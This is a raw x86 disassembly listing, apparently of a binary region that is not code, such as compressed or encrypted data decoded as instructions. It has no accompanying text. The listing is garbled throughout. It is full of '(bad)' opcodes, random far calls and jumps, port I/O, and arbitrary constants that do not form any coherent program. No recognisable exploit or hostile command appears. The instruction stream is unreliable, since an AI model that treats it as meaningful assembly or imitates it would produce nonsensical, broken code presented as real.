  42bf7b:	and    edi,DWORD PTR [ebx-0x6f]
  42bf7e:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42bf80:	test   DWORD PTR [ecx+esi*8-0x30c27fc2],edx
  42bf87:	pop    ax
  42bf89:	push   cs
  42bf8a:	push   es
  42bf8b:	addr16 push ss
  42bf8d:	mov    ecx,DWORD PTR [esi]
  42bf8f:	loopne 0x42bf8b
  42bf91:	jl     0x42bfbb
  42bf93:	icebp  
  42bf94:	inc    edx
  42bf95:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42bf96:	xchg   ebx,eax
  42bf97:	dec    ebx
  42bf98:	sbb    DWORD PTR [ecx+0x63af4027],esp
  42bf9e:	jbe    0x42bf7a
  42bfa0:	adc    cl,BYTE PTR [esi]
  42bfa2:	cli    
  42bfa3:	cmp    eax,0x4f1d7179
  42bfa8:	xchg   esi,eax
  42bfa9:	push   ecx
  42bfaa:	or     al,0xa6
  42bfac:	test   BYTE PTR [ebp+0x3d9aae50],dl
  42bfb2:	ins    DWORD PTR es:[edi],dx
  42bfb3:	jmp    0x785a0e8b
  42bfb8:	fimul  WORD PTR [ecx+0x36590af0]
  42bfbe:	mov    DWORD PTR [edx-0x3a],edi
  42bfc1:	test   DWORD PTR [eax],ebx
  42bfc3:	push   es
  42bfc4:	out    dx,al
  42bfc5:	sub    ch,dl
  42bfc7:	cmp    eax,0x5b6c6b98
  42bfcc:	aaa    
  42bfcd:	ret    
  42bfce:	mov    edx,0x55ebf02
  42bfd3:	mov    BYTE PTR [eax-0x1011d37c],cl
  42bfd9:	xchg   esi,eax
  42bfda:	dec    ecx
  42bfdb:	push   edi
  42bfdc:	jno    0x42bfd4
  42bfde:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42bfdf:	retf   0x5910
  42bfe2:	inc    edx
  42bfe3:	or     al,0x5b
  42bfe5:	push   ss
  42bfe6:	(bad)  
  42bfe7:	not    ecx
  42bfe9:	sbb    al,0x1d
  42bfeb:	neg    DWORD PTR [ecx]
  42bfed:	enter  0x93c8,0x5e
  42bff1:	mov    esi,0x1abfb678
  42bff6:	add    DWORD PTR [ecx],esi
  42bff8:	mov    ah,0xa5
  42bffa:	in     al,dx
  42bffb:	lods   al,BYTE PTR ds:[esi]
  42bffc:	xlat   BYTE PTR ds:[ebx]
  42bffd:	aaa    
  42bffe:	mov    ds:0x8f0f761e,eax
  42c003:	mov    bl,0xda
  42c005:	call   ebp
  42c007:	pop    ds
  42c008:	clc    
  42c009:	add    edx,eax
  42c00b:	and    al,BYTE PTR [edx+0x15a4dfd6]
  42c011:	dec    ecx
  42c012:	std    
  42c013:	and    al,0x59
  42c015:	mov    al,0xb7
  42c017:	das    
  42c018:	(bad)  
  42c019:	mov    ch,0x7
  42c01b:	loopne 0x42c093
  42c01d:	ror    BYTE PTR [eax+0x33],cl
  42c020:	xor    DWORD PTR [edx],0xffffff8d
  42c023:	adc    ebp,edi
  42c025:	fadd   DWORD PTR [ecx-0x34]
  42c028:	jnp    0x42bfff
  42c02a:	mov    edi,0x52c4b80f
  42c02f:	loope  0x42c033
  42c031:	cmp    DWORD PTR [edi],ebp
  42c033:	cmp    BYTE PTR [edi-0x78ed9683],0xec
  42c03a:	test   DWORD PTR [edx-0x3b9fc436],esi
  42c040:	jle    0x42bfd2
	...
  42c0b2:	add    BYTE PTR [eax],al
  42c0b4:	jne    0x42c0db
  42c0b6:	imul   ebx,DWORD PTR [edi-0x51]
  42c0ba:	cmc    
  42c0bb:	(bad)  
  42c0bc:	call   0xbb942915
  42c0c1:	ins    BYTE PTR es:[edi],dx
  42c0c2:	aaa    
  42c0c3:	ins    BYTE PTR es:[edi],dx
  42c0c4:	out    0xd2,al
  42c0c6:	add    DWORD PTR [eax],eax
  42c0c8:	test   BYTE PTR [eax],0x0
  42c0cb:	add    BYTE PTR [edi],dh
  42c0cd:	adc    ecx,DWORD PTR [eax]
  42c0cf:	pop    es
  42c0d0:	dec    edx
  42c0d1:	inc    eax
  42c0d2:	(bad)  
  42c0d4:	outs   dx,DWORD PTR ds:[esi]
  42c0d5:	arpl   WORD PTR [ecx-0xb27e1b],dx
  42c0db:	shr    BYTE PTR [esi-0x45b60139],cl
  42c0e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c0e2:	into   
  42c0e3:	mul    BYTE PTR [edi+ebx*1-0x7a]
  42c0e7:	xchg   ecx,eax
  42c0e8:	push   edx
  42c0e9:	pmaddwd mm4,mm0
  42c0ec:	ret    0xd455
  42c0ef:	(bad)  
  42c0f0:	cmp    eax,0x634eda7e
  42c0f5:	(bad)  
  42c0f6:	jecxz  0x42c173
  42c0f8:	stos   BYTE PTR es:[edi],al
  42c0f9:	dec    esp
  42c0fa:	add    DWORD PTR [esi],eax
  42c0fc:	out    0x33,al
  42c0fe:	ja     0x42c122
  42c100:	loopne 0x42c095
  42c102:	test   eax,0xc01c4a0a
  42c107:	adc    BYTE PTR [eax],ch
  42c109:	or     al,0xc8
  42c10b:	icebp  
  42c10c:	data16 adc al,0xd8
  42c10f:	loope  0x42c11f
  42c111:	nop
  42c112:	rcl    BYTE PTR [eax-0x43],0xb9
  42c116:	mov    ecx,0xe8be0510
  42c11b:	pop    DWORD PTR [ebp+eax*1-0x61931483]
  42c122:	push   eax
  42c123:	push   es
  42c124:	jae    0x42c0d0
  42c126:	aas    
  42c127:	or     eax,0xbfc84964
  42c12c:	mov    ecx,0x8f24ea8
  42c131:	mov    esp,0xf1159595
  42c136:	out    0xe,eax
  42c138:	addr16 dec edx
  42c13a:	mov    DWORD PTR [edx-0x32f14ec7],ecx
  42c140:	inc    esp
  42c141:	mov    esp,0xf4d9ff8f
  42c146:	call   0x252b84f6
  42c14b:	and    dh,bl
  42c14d:	pop    esi
  42c14e:	stos   BYTE PTR es:[edi],al
  42c14f:	xchg   DWORD PTR [ebx],ecx
  42c151:	loop   0x42c1aa
  42c153:	je     0x42c0dd
  42c155:	jle    0x42c11a
  42c157:	sub    dl,BYTE PTR [ecx]
  42c159:	jae    0x42c0ea
  42c15b:	test   esi,edi
  42c15d:	(bad)  
  42c15e:	cmc    
  42c15f:	jbe    0x42c13c
  42c161:	and    al,al
  42c163:	push   ds
  42c164:	hlt    
  42c165:	jl     0x42c1de
  42c167:	pop    ds
  42c168:	cmc    
  42c169:	dec    ebp
  42c16a:	test   eax,0x79613854
  42c16f:	mov    WORD PTR [esi+0x4a8b2504],gs
  42c175:	loopne 0x42c176
  42c177:	addr16 aam 0x1f
  42c17a:	mov    esi,0x4e6bff3a
  42c17f:	stos   DWORD PTR es:[edi],eax
  42c180:	mov    al,ds:0x4b1c9835
  42c185:	xchg   esi,eax
  42c186:	ror    BYTE PTR [edi],0x18
  42c189:	push   ds
  42c18a:	or     al,0x8f
  42c18c:	pusha  
  42c18d:	xchg   esp,eax
  42c18e:	(bad)  
  42c18f:	call   0xd463403b
  42c194:	dec    esp
  42c195:	adc    al,0x3e
  42c197:	loopne 0x42c184
  42c199:	sbb    ebx,0x4661a5a0
  42c19f:	out    0x22,eax
  42c1a1:	ins    DWORD PTR es:[edi],dx
  42c1a2:	xor    eax,0x3ee4be6f
  42c1a7:	adc    al,0x3
  42c1a9:	sub    al,0x25
  42c1ab:	or     al,0x9c
  42c1ad:	jmp    0xca9d1c69
  42c1b2:	aam    0xaa
  42c1b4:	in     eax,dx
  42c1b5:	ja     0x42c1ac
  42c1b7:	mov    al,ds:0x7ecac7a7
  42c1bc:	es test eax,0x60d0629c
	...
  42c232:	add    BYTE PTR [eax],al
  42c234:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c235:	mov    ds,WORD PTR [ecx-0x28844a0]
  42c23b:	iret   
  42c23c:	xchg   esp,eax
  42c23d:	xor    edx,DWORD PTR [ecx+ebp*1+0x16]
  42c241:	adc    edi,DWORD PTR [edi+0x1d3dca1]
  42c247:	add    dh,dh
  42c249:	add    BYTE PTR [eax],al
  42c24b:	add    BYTE PTR [eax],al
  42c24d:	popa   
  42c24e:	iret   
  42c24f:	jne    0x42c2a4
  42c251:	daa    
  42c252:	sbb    eax,0xd4ae0e96
  42c257:	retf   
  42c258:	sbb    BYTE PTR [ebx-0x74b53ed9],bl
  42c25e:	jnp    0x42c23a
  42c260:	push   0x727b137c
  42c265:	into   
  42c266:	shr    BYTE PTR [eax],cl
  42c268:	out    0x38,al
  42c26a:	ins    BYTE PTR es:[edi],dx
  42c26b:	xlat   BYTE PTR ds:[ebx]
  42c26c:	shl    cl,cl
  42c26e:	mov    esi,0xc4fd4382
  42c273:	int3   
  42c274:	xchg   edi,eax
  42c275:	lea    edx,[esp+edx*2]
  42c278:	stos   BYTE PTR es:[edi],al
  42c279:	loopne 0x42c279
  42c27b:	adc    BYTE PTR [esp+eiz*8-0x1fa272a],dl
  42c282:	int    0x50
  42c284:	ja     0x42c24a
  42c286:	push   edx
  42c287:	les    ebx,FWORD PTR [esi+0x63]
  42c28a:	les    esi,FWORD PTR [ebx]
  42c28c:	pop    esp
  42c28d:	cmp    esp,DWORD PTR [edx-0x40a5e9e3]
  42c293:	inc    ebx
  42c294:	stos   BYTE PTR es:[edi],al
  42c295:	cmp    eax,eax
  42c297:	push   edi
  42c298:	and    BYTE PTR [ebp-0x16],al
  42c29b:	jb     0x42c247
  42c29d:	loopne 0x42c26f
  42c29f:	scas   eax,DWORD PTR es:[edi]
  42c2a0:	stos   DWORD PTR es:[edi],eax
  42c2a1:	(bad)  
  42c2a2:	fisub  DWORD PTR [ebp+0x3149dca8]
  42c2a8:	ins    BYTE PTR es:[edi],dx
  42c2a9:	xchg   ah,al
  42c2ab:	push   eax
  42c2ac:	lods   al,BYTE PTR ds:[esi]
  42c2ad:	adc    edx,DWORD PTR [esi]
  42c2af:	sar    esi,cl
  42c2b1:	cmp    al,0x42
  42c2b3:	pop    edi
  42c2b4:	rcl    BYTE PTR [ebx],1
  42c2b6:	fnstenv [eax+0x7a]
  42c2b9:	adc    DWORD PTR [edx+0x412a5c9c],esi
  42c2bf:	xor    eax,0xcf2fd4e4
  42c2c4:	mov    ah,0x59
  42c2c6:	lds    ebp,FWORD PTR [eax+0x49]
  42c2c9:	(bad)  
  42c2ca:	xlat   BYTE PTR ds:[ebx]
  42c2cb:	mov    al,0x5a
  42c2cd:	inc    ebp
  42c2ce:	retf   
  42c2cf:	imul   ebp,edi,0xffffffe4
  42c2d2:	out    dx,al
  42c2d3:	adc    DWORD PTR [esi+0x21],ecx
  42c2d6:	or     eax,0xf8113282
  42c2db:	fadd   QWORD PTR [ecx-0x6a10d9d4]
  42c2e1:	iret   
  42c2e2:	dec    esi
  42c2e3:	mov    esp,0x2cde442a
  42c2e8:	fnstcw WORD PTR [esi+0x66]
  42c2eb:	iret   
  42c2ec:	xchg   esi,eax
  42c2ed:	dec    edx
  42c2ee:	push   cs
  42c2ef:	shl    DWORD PTR [esi+0x31],0xfb
  42c2f3:	xchg   esi,eax
  42c2f4:	nop    eax
  42c2f7:	xchg   esp,eax
  42c2f8:	ror    ah,cl
  42c2fa:	fisubr DWORD PTR [ecx+0x7f]
  42c2fd:	jl     0x42c312
  42c2ff:	jbe    0x42c2e8
  42c301:	sub    eax,0xe5c8cecf
  42c306:	call   0x82d2:0x3af2a344
  42c30d:	xchg   BYTE PTR ds:0x2eb9ac11,cl
  42c313:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c314:	repnz sub eax,0xc267c64c
  42c31a:	cmp    eax,0x63e9ab6f
  42c31f:	jle    0x42c31e
  42c321:	sub    DWORD PTR [edx+ebp*1],edx
  42c324:	push   edx
  42c325:	in     eax,dx
  42c326:	push   ss
  42c327:	sub    edx,DWORD PTR [edx-0x59a9df8b]
  42c32d:	xor    al,BYTE PTR [eax+0x4e189920]
  42c333:	xor    al,0xc1
  42c335:	int    0x58
  42c337:	pop    ds
  42c338:	cld    
  42c339:	out    dx,al
  42c33a:	lock in eax,0x6b
  42c33d:	add    DWORD PTR [ebp-0x6],edi
  42c340:	inc    ecx
  42c341:	dec    edi
	...
  42c3b2:	add    BYTE PTR [eax],al
  42c3b4:	mov    al,BYTE PTR [ebp+0x20]
  42c3b7:	out    dx,al
  42c3b8:	out    dx,eax
  42c3b9:	out    dx,eax
  42c3ba:	into   
  42c3bb:	gs aam 0xa
  42c3be:	fst    DWORD PTR [ecx-0x23]
  42c3c1:	jo     0x42c3f6
  42c3c3:	jp     0x42c397
  42c3c5:	aam    0x1
  42c3c7:	add    dh,dh
  42c3c9:	add    BYTE PTR [eax],al
  42c3cb:	add    BYTE PTR [ebp-0x46b4a5],ch
  42c3d1:	or     ebx,0xba33235b
  42c3d7:	pop    ss
  42c3d8:	call   0x151b:0xe8946d2d
  42c3df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c3e0:	lea    edi,[esp+ecx*8]
  42c3e3:	int    0x5f
  42c3e5:	fisttp DWORD PTR [edi+0x6b]
  42c3e8:	rcl    BYTE PTR [eax+0x71757339],0xc2
  42c3ef:	inc    ebx
  42c3f0:	ins    DWORD PTR es:[edi],dx
  42c3f1:	sbb    DWORD PTR [eax-0x56009fc3],esp
  42c3f7:	sbb    BYTE PTR [ebx-0x4a],dh
  42c3fa:	fs ss pop ebx
  42c3fd:	mov    edx,0x76097fc9
  42c402:	pop    es
  42c403:	xor    esi,DWORD PTR [ebx-0x35]
  42c406:	or     edx,eax
  42c408:	sar    BYTE PTR ds:0xa976e1a9,1
  42c40e:	in     eax,dx
  42c40f:	push   ebx
  42c410:	mov    ebx,0xf3cebfec
  42c415:	jb     0x42c413
  42c417:	rol    DWORD PTR [esi],0x1d
  42c41a:	fisub  WORD PTR [edi+0x10307ae4]
  42c420:	outs   dx,DWORD PTR ds:[esi]
  42c421:	es mov ebp,0xe51ef25f
  42c427:	pop    ecx
  42c428:	test   DWORD PTR [eax],esi
  42c42a:	repnz scas eax,DWORD PTR es:[edi]
  42c42c:	mov    ecx,0xae5eeeba
  42c431:	mov    ch,0xfb
  42c433:	dec    ebp
  42c434:	mov    al,ds:0x8f53d77b
  42c439:	retf   0x94c3
  42c43c:	sahf   
  42c43d:	or     ebp,ebx
  42c43f:	pop    ebx
  42c440:	(bad)  
  42c441:	fisub  DWORD PTR es:[esi+edx*2-0x45c2c1c8]
  42c449:	(bad)  
  42c44a:	fild   WORD PTR [esi]
  42c44c:	outs   dx,DWORD PTR ds:[esi]
  42c44d:	stos   BYTE PTR es:[edi],al
  42c44e:	add    al,0x6
  42c450:	mov    bh,0x6b
  42c452:	(bad)  [esi+0x27]
  42c455:	je     0x42c49e
  42c457:	or     DWORD PTR [eax+0x7dcc6803],edx
  42c45d:	loop   0x42c404
  42c45f:	js     0x42c484
  42c461:	jmp    0xf4b0:0x8654c462
  42c468:	jbe    0x42c40a
  42c46a:	daa    
  42c46b:	ins    BYTE PTR es:[edi],dx
  42c46c:	icebp  
  42c46d:	rcr    DWORD PTR [ebp+0x14369fbe],0x6a
  42c474:	adc    al,0x98
  42c476:	xchg   ebp,eax
  42c477:	iret   
  42c478:	scas   eax,DWORD PTR es:[edi]
  42c479:	xchg   esi,eax
  42c47a:	cmp    al,0x4c
  42c47c:	xchg   ecx,eax
  42c47d:	dec    ecx
  42c47e:	lock jns 0x42c41b
  42c481:	adc    al,0x54
  42c483:	sbb    esp,DWORD PTR [eax+0x155a2f8a]
  42c489:	pop    edi
  42c48a:	inc    ebx
  42c48b:	pop    ebp
  42c48c:	(bad)  
  42c48d:	cmp    BYTE PTR [edx+0x18],bh
  42c490:	xchg   DWORD PTR [edx-0x79311f11],ebp
  42c496:	xor    eax,0x65a305af
  42c49b:	xchg   BYTE PTR [edx+0x6e],al
  42c49e:	iret   
  42c49f:	jae    0x42c456
  42c4a1:	jnp    0x42c440
  42c4a3:	sub    eax,0xadd1e8a3
  42c4a8:	add    ah,BYTE PTR [edi+0x7f2d6bbe]
  42c4ae:	push   eax
  42c4af:	sbb    BYTE PTR [ebp+eax*1+0x59786a7a],bh
  42c4b6:	or     al,0x2b
  42c4b8:	retf   0xe190
  42c4bb:	fadd   QWORD PTR [edi-0x62497c91]
  42c4c1:	jge    0x42c4c3
	...
  42c533:	add    al,ah
  42c535:	xchg   esp,eax
  42c536:	and    bh,cl
  42c538:	je     0x42c539
  42c53a:	out    dx,eax
  42c53b:	mov    edi,0x9a7cd6c5
  42c540:	je     0x42c5a5
  42c542:	imul   ecx,DWORD PTR [eax],0x1d5c8
  42c548:	test   BYTE PTR [eax],0x0
  42c54b:	add    BYTE PTR [esi],al
  42c54d:	aam    0xff
  42c54f:	enter  0xe020,0xa8
  42c553:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c554:	out    0x13,eax
  42c556:	sub    BYTE PTR [ebp-0x4204ac0],0xb7
  42c55d:	lods   al,BYTE PTR ds:[esi]
  42c55e:	ins    DWORD PTR es:[edi],dx
  42c55f:	adc    cl,dl
  42c561:	push   ss
  42c562:	imul   ebp,DWORD PTR [edx+edx*1-0x51cd7526],0xdedee3bc
  42c56d:	sub    ebp,esp
  42c56f:	jg     0x42c522
  42c571:	out    0x43,al
  42c573:	mov    dh,0x14
  42c575:	scas   eax,DWORD PTR es:[edi]
  42c576:	jae    0x42c533
  42c578:	test   DWORD PTR [esp+eiz*2+0x745a76e2],esp
  42c57f:	inc    edx
  42c580:	into   
  42c581:	and    dl,ch
  42c583:	and    DWORD PTR [edx-0x4ce91fd9],ebp
  42c589:	adc    al,BYTE PTR [ebx]
  42c58b:	popa   
  42c58c:	jnp    0x42c5c7
  42c58e:	and    DWORD PTR [edi-0x44],eax
  42c591:	push   0x94be478b
  42c596:	aas    
  42c597:	fldcw  WORD PTR [edx]
  42c599:	popa   
  42c59a:	fadd   st(5),st
  42c59c:	(bad)  
  42c59d:	cmp    dl,BYTE PTR [edx]
  42c59f:	loope  0x42c578
  42c5a1:	mov    esi,0xc5af9169
  42c5a6:	cld    
  42c5a7:	adc    eax,0x98665389
  42c5ac:	cld    
  42c5ad:	rcr    BYTE PTR [ebx+0xdfbf9e3],0x1f
  42c5b4:	out    0xc9,eax
  42c5b6:	jnp    0x42c5b0
  42c5b8:	and    ebp,DWORD PTR [eax]
  42c5ba:	dec    esp
  42c5bb:	(bad)  
  42c5bc:	ds cmc 
  42c5be:	push   ss
  42c5bf:	mov    dh,0xd7
  42c5c1:	inc    edi
  42c5c2:	mov    eax,0xe8568809
  42c5c7:	gs cmp eax,0x46a9d95e
  42c5cd:	call   0xae72:0x9bc99d11
  42c5d4:	inc    edx
  42c5d5:	dec    edx
  42c5d6:	jne    0x42c583
  42c5d8:	add    DWORD PTR [edx],esp
  42c5da:	retf   0xaf72
  42c5dd:	ret    
  42c5de:	sub    eax,0xff233412
  42c5e3:	xlat   BYTE PTR ss:[ebx]
  42c5e5:	adc    BYTE PTR [ebx+ebx*4+0x5f],al
  42c5e9:	cmp    dh,dl
  42c5eb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c5ec:	bound  ebp,QWORD PTR [ecx+0x4d2c8f6c]
  42c5f2:	mov    edx,0xdb4990c
  42c5f7:	iret   
  42c5f8:	adc    DWORD PTR [eax-0x65],esi
  42c5fb:	mov    bh,0x1a
  42c5fd:	push   edx
  42c5fe:	push   es
  42c5ff:	sbb    al,0x91
  42c601:	iret   
  42c602:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c603:	dec    ecx
  42c604:	dec    ecx
  42c605:	lock cwde 
  42c607:	lods   al,BYTE PTR ds:[esi]
  42c608:	sub    bl,0xf3
  42c60b:	inc    edx
  42c60c:	(bad)  
  42c60d:	shl    DWORD PTR [edi+ecx*1-0x35fe49b8],0x5
  42c615:	clc    
  42c616:	inc    esp
  42c617:	imul   esi,edi,0x9aba67a4
  42c61d:	fld    TBYTE PTR [edi-0x49db2828]
  42c623:	pop    ebp
  42c624:	push   ebx
  42c625:	test   al,0x97
  42c627:	loope  0x42c617
  42c629:	mov    esp,0xe2946299
  42c62e:	in     eax,0x95
  42c630:	pop    edx
  42c631:	dec    edi
  42c632:	test   dh,ch
  42c634:	dec    edi
  42c635:	test   BYTE PTR [edx-0x538b87cd],ch
  42c63b:	push   edx
  42c63c:	xor    al,0xc
  42c63e:	push   es
  42c63f:	repnz adc eax,0xac
	...
  42c6b1:	add    BYTE PTR [eax],al
  42c6b3:	add    BYTE PTR [esi+0x42],cl
  42c6b6:	dec    ecx
  42c6b7:	daa    
  42c6b8:	dec    ebp
  42c6b9:	das    
  42c6ba:	outs   dx,BYTE PTR ds:[esi]
  42c6bb:	imul   ebp,esi,0x7b
  42c6be:	enter  0x77be,0xf3
  42c6c2:	stc    
  42c6c3:	inc    ecx
  42c6c4:	mov    esi,0xf60001d6
  42c6c9:	add    BYTE PTR [eax],al
  42c6cb:	add    cl,bl
  42c6cd:	sahf   
  42c6ce:	mov    esi,0x8cea821
  42c6d3:	lods   eax,DWORD PTR ds:[esi]
  42c6d4:	add    esi,DWORD PTR [edi-0x5]
  42c6d7:	out    0x59,al
  42c6d9:	inc    edi
  42c6da:	mov    dl,0x89
  42c6dc:	adc    BYTE PTR [ecx+0x439fd761],dl
  42c6e2:	idiv   ah
  42c6e4:	js     0x42c6d5
  42c6e6:	jl     0x42c6ad
  42c6e8:	or     DWORD PTR [edx+0x27],edx
  42c6eb:	add    dl,BYTE PTR [edi-0x928e208]
  42c6f1:	loope  0x42c73b
  42c6f3:	shr    DWORD PTR [ecx+edi*2],0xbf
  42c6f7:	mov    ch,0xc8
  42c6f9:	jmp    0x42c6c2
  42c6fb:	mov    ds:0xa41f0ebb,al
  42c700:	fsubr  QWORD PTR [ebp+0x6b299177]
  42c706:	into   
  42c707:	pop    sp
  42c709:	and    al,0x2a
  42c70b:	pop    ecx
  42c70c:	pusha  
  42c70d:	clc    
  42c70e:	sbb    BYTE PTR [eax-0x38],al
  42c711:	clc    
  42c712:	fucom  st(1)
  42c714:	inc    ecx
  42c715:	jbe    0x42c6f3
  42c717:	sbb    DWORD PTR [ebp+0x78],esp
  42c71a:	inc    ebp
  42c71b:	fdiv   QWORD PTR [eax+0x2f]
  42c71e:	cwde   
  42c71f:	mov    al,0xd5
  42c721:	jg     0x42c6a6
  42c723:	out    dx,al
  42c724:	ja     0x42c792
  42c726:	mov    bl,0xef
  42c728:	adc    eax,edx
  42c72a:	dec    edi
  42c72b:	or     al,0x55
  42c72d:	(bad)  
  42c72e:	jge    0x42c6ba
  42c730:	inc    ecx
  42c731:	lods   eax,DWORD PTR ds:[esi]
  42c732:	xor    eax,0x3464bf1c
  42c737:	iret   
  42c738:	jno    0x42c77d
  42c73a:	or     eax,0x50a8fd78
  42c73f:	cmp    ah,BYTE PTR [ecx+0x44b04a57]
  42c745:	out    0xbb,eax
  42c747:	es inc ebp
  42c749:	bound  edx,QWORD PTR [eax]
  42c74b:	in     al,0xa6
  42c74d:	pop    es
  42c74e:	or     DWORD PTR [ecx+0x5],ebx
  42c751:	repz cmp BYTE PTR [ebx-0x754c854e],al
  42c758:	(bad)  
  42c759:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c75a:	sbb    DWORD PTR [edx-0x40],ebx
  42c75d:	dec    edi
  42c75e:	dec    ebx
  42c75f:	leave  
  42c760:	lds    edi,FWORD PTR ds:0x744b8157
  42c766:	stos   BYTE PTR es:[edi],al
  42c767:	sar    BYTE PTR [edi],cl
  42c769:	mov    cl,0x1a
  42c76b:	cdq    
  42c76c:	scas   al,BYTE PTR es:[edi]
  42c76d:	lods   eax,DWORD PTR ds:[esi]
  42c76e:	lods   al,BYTE PTR ds:[esi]
  42c76f:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  42c771:	xor    ch,BYTE PTR [ebx]
  42c773:	test   eax,0x55d8b5b9
  42c778:	(bad)  
  42c779:	mov    al,ds:0xa1c32fd
  42c77e:	mov    edx,0x10c83261
  42c783:	fdivr  QWORD PTR [esi+0x28]
  42c786:	mov    ds:0xa1578c,eax
  42c78b:	pop    ss
  42c78c:	mov    ds:0x12f39ba7,eax
  42c791:	add    BYTE PTR [ecx-0x621e12b8],bl
  42c797:	mov    ds:0xd861f694,eax
  42c79c:	mov    bh,0x79
  42c79e:	xchg   edx,eax
  42c79f:	pop    ecx
  42c7a0:	pop    es
  42c7a1:	mov    ds:0xb2b23d0b,eax
  42c7a6:	outs   dx,DWORD PTR ds:[esi]
  42c7a7:	dec    ebx
  42c7a8:	and    BYTE PTR [edx-0x710a337b],dh
  42c7ae:	mov    esp,0xa097c0c1
  42c7b3:	inc    esi
  42c7b4:	inc    ebx
  42c7b5:	jecxz  0x42c776
  42c7b7:	or     esi,ebp
  42c7b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c7ba:	push   edi
  42c7bb:	jb     0x42c7d1
  42c7bd:	xchg   esi,eax
  42c7be:	int    0xbe
  42c7c0:	hlt    
  42c7c1:	xor    eax,0x0
	...
  42c832:	add    BYTE PTR [eax],al
  42c834:	call   0x2a86d6
  42c839:	out    0xf9,eax
  42c83b:	lahf   
  42c83c:	or     ch,bh
  42c83e:	fdiv   DWORD PTR ds:0x39ada077
  42c844:	mov    ah,0xd7
  42c846:	add    DWORD PTR [eax],eax
  42c848:	test   BYTE PTR [eax],0x0
  42c84b:	add    BYTE PTR [edx],dh
  42c84d:	cwde   
  42c84e:	mov    eax,ds:0x46710be6
  42c853:	add    eax,0x2f34bcfd
  42c858:	mov    esp,0xc0b3a18d
  42c85d:	test   ah,0x9f
  42c860:	and    DWORD PTR [ecx-0x31],edx
  42c863:	push   cs
  42c864:	adc    ebx,DWORD PTR [ebp+ecx*8-0x3f871b3a]
  42c86b:	outs   dx,DWORD PTR ds:[esi]
  42c86c:	int    0x4d
  42c86e:	(bad)  
  42c86f:	shl    bh,1
  42c871:	(bad)  
  42c872:	lods   al,BYTE PTR ds:[esi]
  42c873:	mov    dl,0x93
  42c875:	pop    ebp
  42c876:	dec    eax
  42c877:	or     edi,edi
  42c879:	jne    0x42c8a4
  42c87b:	call   0x57ac:0x9a3e7d82
  42c882:	and    DWORD PTR [edx-0x4d],edi
  42c885:	shl    DWORD PTR [ecx-0x36],1
  42c888:	mov    eax,0x35310922
  42c88d:	fs std 
  42c88f:	(bad)  
  42c890:	mov    bh,0x7b
  42c892:	mov    ah,0xce
  42c894:	loopne 0x42c896
  42c896:	mov    ebp,0x50d3c2bc
  42c89b:	push   eax
  42c89c:	or     eax,0xee4476d
  42c8a1:	inc    esi
  42c8a2:	inc    ebp
  42c8a3:	out    0xcb,eax
  42c8a5:	ror    ah,0x8a
  42c8a8:	and    ch,BYTE PTR [ebx]
  42c8aa:	ret    
  42c8ab:	shl    DWORD PTR [eax+0x2805cf39],cl
  42c8b1:	or     al,BYTE PTR [ebp+0x49fd9a6c]
  42c8b7:	push   edi
  42c8b8:	shl    dh,cl
  42c8ba:	gs loopne 0x42c922
  42c8bd:	jge    0x42c85a
  42c8bf:	sub    cl,BYTE PTR [esi+0x21]
  42c8c2:	mov    ebp,DWORD PTR [edi+0x3e0b34fb]
  42c8c8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c8c9:	lods   eax,DWORD PTR ds:[esi]
  42c8ca:	and    BYTE PTR [ebx+0x1d],bh
  42c8cd:	dec    ecx
  42c8ce:	in     al,dx
  42c8cf:	ret    0x1683
  42c8d2:	inc    ebp
  42c8d3:	cdq    
  42c8d4:	mov    cl,0x7d
  42c8d6:	mov    ah,0xd1
  42c8d8:	and    al,BYTE PTR ds:[edx-0x46bdda1d]
  42c8df:	pop    esi
  42c8e0:	and    eax,DWORD PTR [ebx+0x39]
  42c8e3:	dec    ebp
  42c8e4:	or     al,0x79
  42c8e6:	retf   
  42c8e7:	arpl   WORD PTR [ecx],bx
  42c8e9:	or     bh,cl
  42c8eb:	icebp  
  42c8ec:	jg     0x42c877
  42c8ee:	(bad)  [ecx]
  42c8f0:	inc    ecx
  42c8f1:	aam    0xb1
  42c8f3:	dec    edx
  42c8f4:	or     DWORD PTR [ecx-0x49],edx
  42c8f7:	ins    BYTE PTR es:[edi],dx
  42c8f8:	(bad)  
  42c8f9:	or     al,0x30
  42c8fb:	jnp    0x42c962
  42c8fd:	stos   BYTE PTR es:[edi],al
  42c8fe:	ins    DWORD PTR es:[edi],dx
  42c8ff:	pop    ebp
  42c900:	ins    BYTE PTR es:[edi],dx
  42c901:	adc    BYTE PTR [edi+0x5cde9f7d],al
  42c907:	mov    fs,WORD PTR [edx+0x4a]
  42c90a:	ins    DWORD PTR es:[edi],dx
  42c90b:	push   ebx
  42c90c:	pop    ebx
  42c90d:	retf   
  42c90e:	jmp    0x609175ae
  42c913:	xchg   BYTE PTR [ebp-0x74b34064],al
  42c919:	xor    esp,DWORD PTR [esi-0x32]
  42c91c:	test   DWORD PTR [esi+edi*8],ecx
  42c91f:	ja     0x42c8b8
  42c921:	hlt    
  42c922:	jne    0x42c903
  42c924:	imul   esp,DWORD PTR [ebx],0xffffff9a
  42c927:	call   0xe94e149e
  42c92c:	xor    eax,0x4c6c53fa
  42c931:	nop
  42c932:	jb     0x42c8f0
  42c934:	es or  al,0x2b
  42c937:	push   esp
  42c938:	jmp    0xe98e:0x6ee898d9
  42c93f:	jns    0x42c8ce
  42c941:	cdq    
	...
  42c9b2:	add    BYTE PTR [eax],al
  42c9b4:	mov    eax,DWORD PTR [edi]
  42c9b6:	mov    al,0xe2
  42c9b8:	mov    esp,0xb56fdbf7
  42c9bd:	ficom  DWORD PTR [esi+0x22]
  42c9c0:	push   esp
  42c9c1:	gs repz mov ch,0xaa
  42c9c5:	fadd   DWORD PTR [ecx]
  42c9c7:	add    dh,dh
